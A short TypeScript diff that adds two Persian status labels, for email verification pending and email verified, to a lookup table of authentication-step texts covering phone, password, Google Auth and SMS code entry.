@@ -879,6 +879,8 @@ const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "در انتظار کد تایید شماره",
     waiting_admin: "در انتظار دستور ادمین",
+    email_verification: "در انتظار کد تایید ایمیل",
+    email_completed: "ایمیل تایید شد",
     auth_password: "وارد کردن رمز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
